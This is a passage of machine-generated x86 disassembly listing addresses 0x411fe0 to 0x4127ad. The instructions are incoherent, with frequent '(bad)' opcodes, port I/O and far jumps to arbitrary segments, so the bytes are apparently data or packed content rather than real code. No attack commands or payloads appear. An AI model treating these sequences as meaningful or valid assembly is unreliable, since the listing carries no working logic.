  411fe0:	push   edx
  411fe1:	test   eax,0xf4fbdcfe
  411fe6:	ds xchg edi,eax
  411fe8:	lock mov cl,0x7c
  411feb:	xor    DWORD PTR [ecx+0x36f4b863],ecx
  411ff1:	outs   dx,DWORD PTR ds:[esi]
  411ff2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411ff3:	loop   0x412043
  411ff5:	loope  0x412048
  411ff7:	xor    eax,0x77adc779
  411ffc:	out    0x87,eax
  411ffe:	cld    
  411fff:	ror    DWORD PTR [ecx-0x43],cl
  412002:	das    
  412003:	xor    cl,bl
  412005:	(bad)  
  412006:	xchg   ebx,eax
  412007:	sbb    al,0xa2
  412009:	sar    BYTE PTR [ecx-0x59],1
  41200c:	les    eax,FWORD PTR [eax+0x6698def4]
  412012:	icebp  
  412013:	and    DWORD PTR [ebp+0x34],0x3d85758c
  41201a:	xchg   ecx,eax
  41201b:	add    eax,0xcf7d592d
  412020:	and    cl,BYTE PTR [ebp+0x1db9cfff]
  412026:	adc    DWORD PTR [ebp-0x7b53b311],0x7c
  41202d:	inc    ebx
  41202e:	adc    edi,ebx
  412030:	fndisi(8087 only) 
  412032:	pop    eax
  412033:	push   cs
  412034:	mov    ah,0xb3
  412036:	pop    ss
  412037:	popf   
  412038:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412039:	inc    esi
  41203a:	(bad)  
  41203b:	jne    0x412060
  41203d:	inc    edx
  41203e:	mov    cl,0x34
  412040:	or     edx,DWORD PTR [eax+0x5674b348]
  412046:	aaa    
  412047:	xchg   esi,eax
  412048:	xor    DWORD PTR [ebp-0x585e98df],ecx
  41204e:	dec    esi
  41204f:	loopne 0x41205b
  412051:	(bad)
  412056:	leave  
  412057:	int3   
  412058:	jmp    0x23c:0xc93a8968
  41205f:	cmp    DWORD PTR [esi],esp
  412061:	add    eax,0x9e8a3dca
  412066:	lods   eax,DWORD PTR ds:[esi]
  412067:	pop    es
  412068:	test   BYTE PTR [esi+0x6ab69f39],al
  41206e:	cwde   
  41206f:	jo     0x41205a
  412071:	(bad)  
  412072:	out    dx,eax
  412073:	add    BYTE PTR [esp+edx*1-0x2f22e7aa],cl
  41207a:	pop    ss
  41207b:	push   edi
  41207c:	pop    edx
  41207d:	mov    ch,0x8c
  41207f:	pop    ss
  412080:	popf   
  412081:	repnz sub al,0xd8
  412084:	xor    al,0x45
  412086:	gs mov edx,0x3a263625
  41208c:	adc    edx,esi
  41208e:	sbb    al,0x2e
  412090:	pop    ebp
  412091:	call   0x3ce8:0x3b89f800
  412098:	jmp    0x153b737c
  41209d:	mov    fs,WORD PTR [ebp-0x1d6f7e46]
  4120a3:	cwde   
  4120a4:	xchg   ebp,eax
  4120a5:	or     ecx,esp
  4120a7:	ficom  DWORD PTR [edi-0x6984df69]
  4120ad:	int3   
  4120ae:	ja     0x4120dd
  4120b0:	pop    eax
  4120b1:	push   ds
  4120b2:	arpl   WORD PTR [esi],bx
  4120b4:	mov    ecx,0x4b00c0f6
  4120b9:	jecxz  0x4120e3
  4120bb:	jge    0x412080
  4120bd:	into   
  4120be:	lea    edx,[edx-0x1f]
  4120c1:	dec    edx
  4120c2:	mov    al,ds:0x25891b9f
  4120c7:	std    
  4120c8:	out    dx,al
  4120c9:	cwde   
  4120ca:	mov    ds:0x5781bf9e,eax
  4120cf:	mov    dl,0xf7
  4120d1:	fiadd  DWORD PTR fs:[ebx-0x51ac3364]
  4120d8:	in     al,dx
  4120d9:	daa    
  4120da:	stos   BYTE PTR es:[edi],al
  4120db:	inc    ebp
  4120dc:	push   ebp
  4120dd:	mov    ch,dh
  4120df:	lahf   
  4120e0:	mov    ds:0xa690410d,eax
  4120e5:	fisub  DWORD PTR [ebx]
  4120e7:	(bad)  
  4120e8:	retf   
  4120e9:	inc    ebx
  4120ea:	xor    eax,0x7231fd1f
  4120ef:	push   ds
  4120f0:	cmp    eax,0x1668aa4e
  4120f5:	mov    al,0x3e
  4120f7:	mov    ah,0xee
  4120f9:	and    dh,bl
  4120fb:	out    dx,al
  4120fc:	aam    0x44
  4120fe:	add    eax,0xc7fe1d90
  412103:	stc    
  412104:	addr16 xchg ebp,eax
  412106:	cmp    DWORD PTR [ecx],esp
  412108:	in     al,0xfb
  41210a:	fld    TBYTE PTR [edi]
  41210c:	mov    eax,fs:0xa54a40ed
  412112:	inc    esp
  412113:	cmp    BYTE PTR [eax],al
  412115:	dec    edi
  412116:	ins    BYTE PTR es:[edi],dx
  412117:	ret    
  412118:	push   ebp
  412119:	loop   0x4120b0
  41211b:	xchg   esi,eax
  41211c:	imul   ecx,esi,0xfffffffb
  41211f:	cmp    cl,BYTE PTR [edx+0x7b610694]
  412125:	fcomp  DWORD PTR [ebp*8-0xd312e6d]
  41212c:	call   DWORD PTR [edx+0x47cf0fe0]
  412132:	jle    0x412196
  412134:	mov    ah,0x8a
  412136:	jae    0x412173
  412138:	loope  0x4120d4
  41213a:	jecxz  0x4120c5
  41213c:	and    DWORD PTR [ebp+ebx*1-0xcd2a841],0x581940e8
  412147:	cdq    
  412148:	mov    ch,0xb6
  41214a:	mov    edx,0x4373605a
  41214f:	fisubr DWORD PTR [eax]
  412151:	out    0x75,al
  412153:	nop
  412154:	mov    esp,0xbeb53e38
  412159:	in     eax,0x55
  41215b:	rol    DWORD PTR [ebp+edi*2+0x7d25e76d],0xb2
  412163:	aad    0xf3
  412165:	fisubr DWORD PTR [edi+0xd]
  412168:	inc    esp
  412169:	mov    dh,0xdc
  41216b:	pop    edi
  41216c:	pusha  
  41216d:	outs   dx,BYTE PTR ds:[esi]
  41216e:	jp     0x4121e6
  412170:	mov    bl,0x9
  412172:	adc    cl,cl
  412174:	xor    BYTE PTR ss:[esi+0x60],al
  412178:	sbb    DWORD PTR [ecx+0x64],ebp
  41217b:	test   eax,0x85ed063
  412180:	adc    eax,0x7efec34f
  412185:	push   ecx
  412186:	pop    ebp
  412187:	pushf  
  412188:	adc    DWORD PTR [edx+0x46c2af8e],eax
  41218e:	sbb    bh,BYTE PTR [eax]
  412190:	stos   DWORD PTR es:[edi],eax
  412191:	dec    ebp
  412192:	xchg   esp,eax
  412193:	pop    esp
  412194:	repz adc al,0x80
  412197:	sti    
  412198:	popf   
  412199:	ret    
  41219a:	call   0x63b53fb2
  41219f:	push   ds
  4121a0:	fisttp QWORD PTR [esi]
  4121a2:	bound  esi,QWORD PTR [eax]
  4121a4:	adc    eax,0x6473ede2
  4121a9:	aas    
  4121aa:	mov    eax,DWORD PTR [esi]
  4121ac:	pusha  
  4121ad:	adc    eax,0x133f9550
  4121b2:	xor    BYTE PTR [ecx],0xa1
  4121b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4121b6:	iret   
  4121b7:	xor    al,0x4b
  4121b9:	loop   0x4121e7
  4121bb:	add    edi,DWORD PTR [ebx+0x99b8460]
  4121c1:	test   eax,0xdb5a9801
  4121c6:	mov    ebp,es
  4121c8:	out    0x65,eax
  4121ca:	inc    ebx
  4121cb:	mov    BYTE PTR [edi+0x27],dl
  4121ce:	pop    eax
  4121cf:	dec    edx
  4121d0:	lds    ecx,FWORD PTR [esp+esi*8+0x2ff2367c]
  4121d7:	pushf  
  4121d8:	push   cs
  4121d9:	out    0x3a,al
  4121db:	pop    ss
  4121dc:	retf   
  4121dd:	mov    al,0xfc
  4121df:	or     al,dh
  4121e1:	xlat   BYTE PTR ds:[ebx]
  4121e2:	std    
  4121e3:	sub    BYTE PTR [ecx-0x12],ah
  4121e6:	sub    al,0xba
  4121e8:	mov    cl,0xa1
  4121ea:	retf   
  4121eb:	mov    ah,0x27
  4121ed:	mov    ebx,0x1e7e4494
  4121f2:	popf   
  4121f3:	adc    esp,ecx
  4121f5:	add    DWORD PTR [eax],edi
  4121f7:	das    
  4121f8:	jmp    0x5bf8:0x4f0da01
  4121ff:	dec    esi
  412200:	in     al,dx
  412201:	jns    0x4121be
  412203:	je     0x412187
  412205:	sti    
  412206:	gs popa 
  412208:	les    ebp,FWORD PTR cs:[esi]
  41220b:	cdq    
  41220c:	adc    eax,0xa87ef136
  412211:	mov    esi,0xb016ba8c
  412216:	cmp    ebp,DWORD PTR ds:0xb8e1edc7
  41221c:	jge    0x412204
  41221e:	pop    esp
  41221f:	push   ebx
  412220:	cmp    ebx,edx
  412222:	daa    
  412223:	adc    eax,0xa080cea3
  412228:	(bad)  
  412229:	pusha  
  41222a:	xlat   BYTE PTR ds:[ebx]
  41222b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41222c:	shl    dh,0x60
  41222f:	or     eax,0x24ef8f80
  412234:	xchg   esi,eax
  412235:	stos   DWORD PTR es:[edi],eax
  412236:	stos   DWORD PTR es:[edi],eax
  412237:	adc    al,0x52
  412239:	ficom  WORD PTR [edi-0x21ee47b9]
  41223f:	scas   al,BYTE PTR es:[edi]
  412240:	push   ds
  412241:	ins    BYTE PTR es:[edi],dx
  412242:	test   BYTE PTR [edi-0x69397d70],ch
  412248:	add    BYTE PTR [edi+0x3e],ch
  41224b:	sbb    BYTE PTR [eax-0x244cae36],bh
  412251:	test   al,0x99
  412253:	sbb    eax,edi
  412255:	std    
  412256:	pop    ecx
  412257:	mov    ah,BYTE PTR [eax-0x54d25b21]
  41225d:	aaa    
  41225e:	shl    dl,0x73
  412261:	sbb    al,BYTE PTR [edx-0x6432837e]
  412267:	inc    edx
  412268:	dec    esi
  412269:	mov    dl,0x1c
  41226b:	bnd jno 0x41225d
  41226e:	pop    ax
  412270:	iret   
  412271:	popa   
  412272:	or     al,0x1f
  412274:	jb     0x412264
  412276:	pop    es
  412277:	lods   al,BYTE PTR ds:[esi]
  412278:	ins    DWORD PTR es:[edi],dx
  412279:	int    0x3d
  41227b:	adc    ah,BYTE PTR [ebx-0x431db061]
  412281:	leave  
  412282:	add    al,BYTE PTR [ebp-0x74]
  412285:	add    DWORD PTR [edx+0x2d],0xffffffd2
  412289:	inc    esp
  41228a:	xor    BYTE PTR ds:0xde2d2b2b,bh
  412290:	(bad)  
  412291:	mov    ebp,DWORD PTR [edi+eiz*4]
  412294:	jg     0x412226
  412296:	stc    
  412297:	jno    0x412247
  412299:	test   BYTE PTR [ebx-0x533dc5ef],dl
  41229f:	out    0x3a,al
  4122a1:	data16 sbb bh,ch
  4122a4:	or     dl,BYTE PTR ds:0x7bfce914
  4122aa:	lahf   
  4122ab:	je     0x4122ed
  4122ad:	mov    bh,0xe6
  4122af:	push   es
  4122b0:	sbb    DWORD PTR [esi],edx
  4122b2:	mov    esp,0x1654bd89
  4122b7:	fsub   QWORD PTR [ebx]
  4122b9:	leave  
  4122ba:	div    BYTE PTR [edx-0x1eeee063]
  4122c0:	stos   BYTE PTR es:[edi],al
  4122c1:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  4122c3:	ins    DWORD PTR es:[edi],dx
  4122c4:	sbb    eax,0x7c2ffedf
  4122c9:	ret    0x18a3
  4122cc:	int3   
  4122cd:	dec    ebp
  4122ce:	push   ebp
  4122cf:	shl    ebp,cl
  4122d1:	pop    edi
  4122d2:	outs   dx,DWORD PTR ds:[esi]
  4122d3:	(bad)  
  4122d4:	cmp    ebp,ebx
  4122d6:	cld    
  4122d7:	jle    0x412330
  4122d9:	mov    cl,0x0
  4122db:	pusha  
  4122dc:	in     eax,dx
  4122dd:	daa    
  4122de:	jbe    0x41226b
  4122e0:	push   es
  4122e1:	push   edi
  4122e2:	inc    edi
  4122e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4122e4:	cwde   
  4122e5:	inc    edi
  4122e6:	mov    ds:0x90664502,al
  4122eb:	mov    al,0x3f
  4122ed:	and    ebp,DWORD PTR ds:0xc79c6b73
  4122f3:	sub    al,0x4d
  4122f5:	fiadd  WORD PTR [eax+0x46]
  4122f8:	sub    eax,eax
  4122fa:	rol    BYTE PTR [ebx+esi*4],cl
  4122fd:	outs   dx,DWORD PTR ds:[esi]
  4122fe:	daa    
  4122ff:	xchg   edx,eax
  412300:	push   cs
  412301:	mov    ah,0x48
  412303:	lods   eax,DWORD PTR ds:[esi]
  412304:	dec    ecx
  412305:	inc    edx
  412306:	repz out 0xcb,al
  412309:	adc    DWORD PTR [ebp+eiz*1+0x6064d3ba],0xfffffff4
  412311:	mov    ds:0x42af6e14,eax
  412316:	pop    ebx
  412317:	push   edx
  412318:	cld    
  412319:	xor    DWORD PTR [ebp-0x20],0x61
  41231d:	jecxz  0x4122df
  41231f:	adc    al,0x3
  412321:	lahf   
  412322:	pop    edi
  412323:	stos   DWORD PTR es:[edi],eax
  412324:	push   ebp
  412325:	dec    edx
  412326:	dec    esp
  412327:	in     al,dx
  412328:	retf   
  412329:	inc    eax
  41232a:	inc    edx
  41232b:	cmp    DWORD PTR [edi+0x6b],0xffffffd6
  41232f:	frstor [esi+ebp*8-0x1c6e3ee2]
  412336:	adc    cl,ah
  412338:	cmp    eax,0x47d57460
  41233d:	rol    DWORD PTR [ebp+0x2d857eba],cl
  412343:	sbb    BYTE PTR [ebp+0x51],bh
  412346:	sub    ch,BYTE PTR [ebx+0x1226ba85]
  41234c:	in     al,0x38
  41234e:	inc    edi
  41234f:	ja     0x4122ea
  412351:	cdq    
  412352:	cli    
  412353:	js     0x4123c1
  412355:	push   edx
  412356:	shl    DWORD PTR ds:0xb974a286,cl
  41235c:	adc    al,0xc0
  41235e:	jns    0x41236f
  412360:	dec    ecx
  412361:	int3   
  412362:	jae    0x412315
  412364:	jmp    0x412379
  412366:	jmp    FWORD PTR [eax]
  412368:	jnp    0x41230b
  41236a:	fsub   st,st(1)
  41236c:	dec    esp
  41236d:	(bad)  
  41236e:	ss jns 0x412349
  412371:	sub    ch,BYTE PTR gs:[edi+0x50d06379]
  412378:	daa    
  412379:	mov    edx,0xe821b862
  41237e:	test   eax,0x36733be6
  412383:	push   es
  412384:	pop    eax
  412385:	jae    0x412367
  412387:	je     0x412311
  412389:	dec    ebx
  41238a:	out    dx,eax
  41238b:	cld    
  41238c:	lock jmp DWORD PTR [eax+0x6c]
  412390:	add    eax,0x612e109c
  412395:	push   esi
  412396:	addr16 getsec 
  412399:	jge    0x4123f6
  41239b:	xchg   ecx,eax
  41239c:	mov    ebp,DWORD PTR [edx+0x63]
  41239f:	stos   BYTE PTR es:[edi],al
  4123a0:	ds or  esp,eax
  4123a3:	sbb    ah,BYTE PTR [eax+0x693b5508]
  4123a9:	inc    ebp
  4123aa:	sbb    al,0x9f
  4123ac:	ss pop ss
  4123ae:	cli    
  4123af:	scas   eax,DWORD PTR es:[edi]
  4123b0:	xor    al,0xb5
  4123b2:	fwait
  4123b3:	pusha  
  4123b4:	shr    BYTE PTR [ebx-0x18],1
  4123b7:	push   cs
  4123b8:	in     eax,0xcd
  4123ba:	xchg   ecx,eax
  4123bb:	mov    DWORD PTR [ebp-0x4b],esi
  4123be:	xchg   ebx,eax
  4123bf:	sub    eax,0x9f80a4cc
  4123c4:	div    BYTE PTR [eax+edi*4]
  4123c7:	out    dx,al
  4123c8:	scas   al,BYTE PTR es:[edi]
  4123c9:	imul   esp,DWORD PTR [edx],0xae13e4da
  4123cf:	add    eax,0x83b627c5
  4123d4:	cld    
  4123d5:	loopne 0x4123b1
  4123d7:	mov    ds:0x49bba136,al
  4123dc:	and    edi,DWORD PTR [esi+0x4ad31015]
  4123e2:	aaa    
  4123e3:	adc    ebx,DWORD PTR [edx]
  4123e5:	fxch   st(7)
  4123e7:	js     0x4123ad
  4123e9:	push   edx
  4123ea:	sub    edx,DWORD PTR [edi-0x5cb6b083]
  4123f0:	mov    eax,ds:0xe66dbb48
  4123f5:	jnp    0x41246a
  4123f7:	push   ecx
  4123f8:	mov    edi,0x743e1431
  4123fd:	mov    esp,fs
  4123ff:	pushf  
  412400:	sbb    eax,0x7c18718e
  412405:	rol    dh,cl
  412407:	out    dx,eax
  412408:	std    
  412409:	(bad)  
  41240a:	out    dx,al
  41240b:	(bad)
  41240e:	mov    esp,0xae2a5e26
  412413:	cwde   
  412414:	jle    0x412482
  412416:	push   esi
  412417:	hlt    
  412418:	test   BYTE PTR [ebx-0x2a],bh
  41241b:	jno    0x412444
  41241d:	in     eax,dx
  41241e:	dec    ecx
  41241f:	jns    0x4123e7
  412421:	sub    eax,0x80d23f2f
  412426:	mov    ebx,0xf60fbc77
  41242b:	push   cs
  41242c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41242d:	retf   
  41242e:	je     0x4123e7
  412430:	data16 daa 
  412432:	mov    esi,0x8d71128b
  412437:	jo     0x4124a6
  412439:	jno    0x41242d
  41243b:	scas   al,BYTE PTR es:[edi]
  41243c:	gs (bad) 
  41243e:	repz clc 
  412440:	push   ebx
  412441:	imul   ecx,DWORD PTR [ecx],0x310dea61
  412447:	dec    ebp
  412448:	int3   
  412449:	dec    ebx
  41244a:	jmp    0x4123fd
  41244c:	(bad)  
  41244e:	sti    
  41244f:	mov    dl,0x8b
  412451:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412452:	inc    ebp
  412453:	add    eax,0xb8ca7820
  412458:	sbb    DWORD PTR [edi],ebp
  41245a:	pop    ss
  41245b:	ret    0x8d2e
  41245e:	push   esp
  41245f:	jge    0x412413
  412461:	or     al,BYTE PTR [ebx-0xee56283]
  412467:	jno    0x4123fd
  412469:	out    dx,eax
  41246a:	push   edi
  41246b:	xchg   esi,eax
  41246c:	mov    ch,0xce
  41246e:	pop    ds
  41246f:	add    al,0x1f
  412471:	cli    
  412472:	mov    esp,0xee9529b7
  412477:	xchg   BYTE PTR [ecx+0x3ccb9662],dh
  41247d:	sbb    esp,DWORD PTR [ebp-0x24b30970]
  412483:	sbb    eax,0x9e855daf
  412488:	fisttp QWORD PTR [eax-0x24e94b3f]
  41248e:	inc    edx
  41248f:	(bad)
  412493:	xor    DWORD PTR [edx+0x3db7400e],eax
  412499:	es xchg edi,eax
  41249b:	pushf  
  41249c:	xor    al,0x48
  41249e:	xor    edx,edx
  4124a0:	(bad)  
  4124a2:	inc    eax
  4124a3:	xchg   edi,eax
  4124a4:	(bad)  [ebx+ebp*1-0x25b007e4]
  4124ab:	in     eax,0x21
  4124ad:	xchg   ebx,eax
  4124ae:	sar    BYTE PTR [ebp-0x77dc4095],1
  4124b4:	data16 and bl,dh
  4124b7:	iret   
  4124b8:	sbb    BYTE PTR [ebx-0x55edd60b],bh
  4124be:	mov    esi,0xd0fe80d4
  4124c3:	lea    eax,[eax-0x48]
  4124c6:	cmc    
  4124c7:	mov    ecx,esi
  4124c9:	sub    cl,0xec
  4124cc:	or     edx,ebp
  4124ce:	scas   al,BYTE PTR es:[edi]
  4124cf:	adc    bh,BYTE PTR [esi-0x43bd739d]
  4124d5:	rcl    DWORD PTR [ecx],cl
  4124d7:	push   ds
  4124d8:	and    al,0x54
  4124da:	mov    eax,0xe23b2701
  4124df:	pop    es
  4124e0:	cmp    DWORD PTR [ecx],edi
  4124e2:	xchg   esp,eax
  4124e3:	pop    esi
  4124e4:	mov    cl,0x96
  4124e6:	popf   
  4124e7:	lds    edi,FWORD PTR [esi+0x767cb30a]
  4124ed:	les    ecx,FWORD PTR [ebx-0x47]
  4124f0:	aas    
  4124f1:	mov    cl,0x7a
  4124f3:	aad    0x1d
  4124f5:	mov    ah,0x61
  4124f7:	sbb    eax,0x453ae5c5
  4124fc:	(bad)  
  4124fd:	pop    ds
  4124fe:	dec    edx
  4124ff:	xchg   esp,eax
  412500:	mov    bh,0x6a
  412502:	adc    eax,0x8b383425
  412507:	outs   dx,BYTE PTR ds:[esi]
  412508:	frstor [ecx]
  41250a:	and    DWORD PTR [ebp+0x3],esi
  41250d:	jecxz  0x41256a
  41250f:	mov    DWORD PTR ds:0xf62a5452,esi
  412515:	mov    al,0x7a
  412517:	sbb    eax,0x646399cb
  41251c:	sub    edi,ebp
  41251e:	pusha  
  41251f:	fimul  DWORD PTR [edx]
  412521:	mov    edx,0x6ef742d2
  412526:	(bad)  
  412527:	adc    cl,BYTE PTR [ebx+ebx*8-0x49]
  41252b:	and    al,0x2e
  41252d:	(bad)  
  41252e:	lds    esi,FWORD PTR [ecx-0xb80447]
  412534:	inc    edx
  412535:	leave  
  412536:	in     al,dx
  412537:	stos   DWORD PTR es:[edi],eax
  412538:	mov    bl,0xa2
  41253a:	dec    esp
  41253b:	push   eax
  41253c:	ror    DWORD PTR [ebx-0x7],0x17
  412540:	mov    cl,0x15
  412542:	jg     0x4125b0
  412544:	mov    dh,0xef
  412546:	jmp    0x3aa9:0x10a88b6b
  41254d:	adc    BYTE PTR [edi+0x4],0x8b
  412551:	cld    
  412552:	mov    bl,0xa1
  412554:	ja     0x4125c0
  412556:	sub    esi,DWORD PTR [edx-0x4dd303af]
  41255c:	vmwrite eax,DWORD PTR [esi+0x47]
  412560:	lahf   
  412561:	aas    
  412562:	fsub   DWORD PTR [ebx]
  412564:	test   esi,0x9f4eb893
  41256a:	fs jns 0x4125de
  41256d:	cwde   
  41256e:	xlat   BYTE PTR ds:[ebx]
  41256f:	sub    BYTE PTR [eax],0x9a
  412572:	mov    esp,0xfd40f3a1
  412577:	cmp    BYTE PTR [esi-0x24],cl
  41257a:	jg     0x412559
  41257c:	leave  
  41257d:	add    al,0xa0
  41257f:	xchg   ecx,eax
  412580:	push   es
  412581:	dec    edx
  412582:	popf   
  412583:	xchg   BYTE PTR [ebp-0xe],dl
  412586:	ret    0xf476
  412589:	(bad)  
  41258a:	out    0x6c,al
  41258c:	xor    DWORD PTR [ebp+0x68],ebp
  41258f:	aas    
  412590:	test   edx,esp
  412592:	dec    ebx
  412593:	aad    0x6e
  412595:	mov    bh,cl
  412597:	add    eax,0xfc5ac6c7
  41259c:	stos   BYTE PTR es:[edi],al
  41259d:	ins    DWORD PTR es:[edi],dx
  41259e:	gs and eax,0xd8510892
  4125a4:	fidivr WORD PTR [esi-0x6cbc13e8]
  4125aa:	in     eax,0x58
  4125ac:	aas    
  4125ad:	lock push 0x870cba7f
  4125b3:	push   0x6c
  4125b5:	loopne 0x4125d4
  4125b7:	xchg   ebp,eax
  4125b8:	lea    esi,[edi-0x5a]
  4125bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4125bc:	adc    al,0x6f
  4125be:	push   esi
  4125bf:	out    0xb0,al
  4125c1:	in     al,0xe0
  4125c3:	or     al,BYTE PTR [esi]
  4125c5:	dec    ebp
  4125c6:	dec    esp
  4125c7:	in     ax,dx
  4125c9:	retf   0xd26c
  4125cc:	add    BYTE PTR [edi+0x2c],bh
  4125cf:	jecxz  0x4125f6
  4125d1:	push   ebp
  4125d2:	repz sub al,0x57
  4125d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4125d6:	stc    
  4125d7:	mov    ebp,0x912a9052
  4125dc:	xlat   BYTE PTR ds:[ebx]
  4125dd:	(bad)  
  4125de:	jne    0x4125b7
  4125e0:	pop    ebx
  4125e1:	dec    edx
  4125e2:	xor    DWORD PTR [edi],edx
  4125e4:	jmp    0xfcbe:0x90738143
  4125eb:	iret   
  4125ec:	rol    DWORD PTR [edx-0x45],0x1d
  4125f0:	cs retfw 0x6cff
  4125f5:	jo     0x4125d8
  4125f7:	imul   ebp,DWORD PTR [ebx*1+0x4995ebae],0xfffffffb
  4125ff:	sbb    DWORD PTR [esi+edi*4-0x5a21ead1],ecx
  412606:	rcr    bh,1
  412608:	icebp  
  412609:	add    al,0x28
  41260b:	lea    edx,[ecx]
  41260d:	add    ecx,DWORD PTR [eax+ebp*4+0x48f66fa7]
  412614:	stc    
  412615:	push   cs
  412616:	dec    eax
  412617:	rol    DWORD PTR [ebx-0x7a811dc3],0x94
  41261e:	inc    ebp
  41261f:	and    DWORD PTR [edi+0x1b],edi
  412622:	or     ebp,ecx
  412624:	cmp    dh,BYTE PTR ds:0x24fe7d22
  41262a:	leave  
  41262b:	das    
  41262c:	jae    0x4125d5
  41262e:	or     ebx,DWORD PTR [esi-0x4fa0a233]
  412634:	mov    al,ds:0xedad95c
  412639:	sbb    dl,BYTE PTR [esi-0x66cf3a2e]
  41263f:	fs push edi
  412641:	or     ch,ch
  412643:	mov    esi,0x81e23605
  412648:	mul    dh
  41264a:	lock push ds
  41264c:	add    edx,esi
  41264e:	pop    es
  41264f:	mov    dh,BYTE PTR [edi]
  412651:	push   eax
  412652:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412653:	das    
  412654:	sti    
  412655:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412656:	out    0x32,eax
  412658:	scas   eax,DWORD PTR es:[edi]
  412659:	lds    esp,FWORD PTR [ecx+0x47]
  41265c:	test   al,0x58
  41265e:	icebp  
  41265f:	cmp    al,0xae
  412661:	scas   eax,DWORD PTR es:[edi]
  412662:	hlt    
  412663:	rcr    DWORD PTR cs:[eax],0x2
  412667:	ret    
  412668:	stos   DWORD PTR es:[edi],eax
  412669:	adc    BYTE PTR es:[ebx],ah
  41266c:	xchg   DWORD PTR [eax],edi
  41266e:	mov    bl,BYTE PTR [ebx+0x3]
  412671:	in     eax,dx
  412672:	pop    ss
  412673:	xor    DWORD PTR [eax-0x13],ebp
  412676:	sti    
  412677:	xchg   DWORD PTR [ecx],esi
  412679:	sbb    eax,0x83321cb9
  41267e:	std    
  41267f:	icebp  
  412680:	test   eax,0xb80648ff
  412685:	mov    fs,ebp
  412687:	sub    DWORD PTR [ecx-0x5b],edi
  41268a:	pop    ecx
  41268b:	repnz dec edi
  41268d:	fisubr WORD PTR [edx-0x67]
  412690:	push   edi
  412691:	jns    0x412621
  412693:	mov    fs,WORD PTR [edx-0x14]
  412696:	fs sbb esi,eax
  412699:	push   cs
  41269a:	call   0x4635:0x84924db9
  4126a1:	mov    dl,0xb8
  4126a3:	imul   esi,DWORD PTR [edx],0xffffffeb
  4126a6:	and    al,0x6b
  4126a8:	pop    edx
  4126a9:	aad    0xc2
  4126ab:	loopne 0x4126fe
  4126ad:	sbb    BYTE PTR [edi+0x51bc9170],al
  4126b3:	xor    DWORD PTR [edx],0x910524ce
  4126b9:	push   ebp
  4126ba:	push   0xb20397c2
  4126bf:	xchg   ebp,eax
  4126c0:	loop   0x4126cd
  4126c2:	fld    DWORD PTR [ebx-0x1bb2b310]
  4126c8:	fist   DWORD PTR [ecx*8+0x10872fb]
  4126cf:	inc    ebp
  4126d0:	sar    DWORD PTR [edx],cl
  4126d2:	pop    edx
  4126d3:	sti    
  4126d4:	inc    ebp
  4126d5:	xor    eax,0x96a7109e
  4126da:	leave  
  4126db:	ror    BYTE PTR [esi+0x26],cl
  4126de:	xchg   edx,eax
  4126df:	pop    edi
  4126e0:	loop   0x4126d2
  4126e2:	mov    esi,0xdaefaac9
  4126e7:	jmp    0x7173267
  4126ec:	in     eax,dx
  4126ed:	xor    BYTE PTR [edi+0x50],al
  4126f0:	je     0x412738
  4126f2:	fbstp  TBYTE PTR [esi+0x3e]
  4126f6:	add    BYTE PTR ds:0x2f4663f8,al
  4126fc:	loope  0x412720
  4126fe:	mov    bl,0x8
  412700:	jmp    0x390e:0xd8bcbc29
  412707:	and    esi,DWORD PTR [edi+0x7a]
  41270a:	loopne 0x412733
  41270c:	pop    ebx
  41270d:	cmp    bh,BYTE PTR [eax]
  41270f:	fsub   QWORD PTR [ecx-0x77bdb895]
  412715:	imul   ecx,edi,0xd90c3cd4
  41271b:	or     DWORD PTR [edx+0x5e59a20c],esi
  412721:	jnp    0x412794
  412723:	jl     0x41276c
  412725:	fwait
  412726:	xchg   edx,eax
  412727:	jle    0x4127a5
  412729:	pop    ebx
  41272a:	push   eax
  41272b:	cmp    ebp,ebp
  41272d:	in     eax,dx
  41272e:	xor    al,0x70
  412730:	push   0xffffffda
  412732:	aam    0x4a
  412734:	cmp    BYTE PTR [edi+0x60],dh
  412737:	xchg   ecx,eax
  412738:	into   
  412739:	gs out dx,eax
  41273b:	pop    edi
  41273c:	xchg   ebp,eax
  41273d:	ffreep st(0)
  41273f:	fisubr DWORD PTR ds:0x5b91e8a1
  412745:	add    ah,dh
  412747:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412748:	sbb    BYTE PTR [esi],ch
  41274a:	retf   0xc855
  41274d:	aam    0xe3
  41274f:	pop    esi
  412750:	xchg   esp,eax
  412752:	adc    eax,0x3c26eeb7
  412757:	mov    dh,0x94
  412759:	(bad)  
  41275a:	ret    0x1e1c
  41275d:	push   0x6
  41275f:	loope  0x41272e
  412761:	loopne 0x4127d8
  412763:	in     al,dx
  412764:	jno    0x4127d1
  412766:	xor    DWORD PTR [edx-0x7f02a248],edi
  41276c:	push   ds
  41276d:	jb     0x412744
  41276f:	lods   eax,DWORD PTR ds:[esi]
  412770:	mov    DWORD PTR [esi-0xe],edi
  412773:	jae    0x412740
  412775:	cmp    DWORD PTR [eax-0x2e550eca],esi
  41277b:	imul   ecx,DWORD PTR [edx-0x1cb17baf],0xf3d2c570
  412785:	es mov dh,0xf3
  412788:	dec    edi
  412789:	ins    BYTE PTR es:[edi],dx
  41278a:	mov    BYTE PTR [edi+0x5e],dl
  41278d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41278e:	outs   dx,DWORD PTR ds:[esi]
  41278f:	cwde   
  412790:	cmp    cl,bl
  412792:	test   al,0xb0
  412794:	mov    BYTE PTR [esi+0x1c],al
  412797:	ret    0x6c9c
  41279a:	mov    ah,0x64
  41279c:	mov    WORD PTR [edi+0x26],?
  41279f:	sub    DWORD PTR [ebp-0x69],ecx
  4127a2:	icebp  
  4127a3:	fld    QWORD PTR [esi]
  4127a5:	sahf   
  4127a6:	inc    edi
  4127a7:	and    BYTE PTR [edx],0xc9
  4127aa:	ret    0x57
  4127ad:	test   eax,0xd6e975b1
